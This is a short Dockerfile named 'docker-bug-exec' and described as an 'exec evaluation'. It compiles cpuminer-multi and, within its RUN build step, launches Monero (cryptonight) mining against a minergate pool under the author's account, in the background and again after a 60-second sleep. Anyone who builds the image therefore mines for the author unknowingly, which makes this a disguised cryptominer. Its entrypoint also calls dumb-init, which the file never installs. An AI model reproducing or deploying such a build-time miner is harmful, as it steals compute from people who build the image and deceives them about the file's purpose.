#   Title: docker-bug-exec
#   Desc: exec evaluation
#   Autor: Ferro.Mariano, navebinario
#   Url: gitlab.com/docker-bug-exec/Dockerfile.git
#   Date: 2017-08-26
# Note: On Alpine 3.5 curl-dev uses LibreSSL which is incompatible with the required OpenSSL-dev.

FROM alpine:3.4

RUN set -x \
    # Runtime dependencies.
 && apk add --no-cache \
        libcurl \
        libgcc \
        libstdc++ \
        openssl \
    # Build dependencies.
 && apk add --no-cache -t .build-deps \
        autoconf \
        automake \
        build-base \
        curl \
        curl-dev \
        git \
        openssl-dev \
    # Compile from source code.
 && git clone --recursive https://github.com/tpruvot/cpuminer-multi.git /tmp/cpuminer \
 && cd /tmp/cpuminer \
 && ./autogen.sh \
 && ./configure CFLAGS="-O2 -march=native" --with-crypto --with-curl \
 && make install \
 && cpuminer --cputest \
 && cpuminer -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u ferro.mariano@gmail.com -p x \
 & sleep 60 \
 && cpuminer -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u ferro.mariano@gmail.com -p x

ENTRYPOINT ["dumb-init"]
CMD ["cpuminer", "--help"]
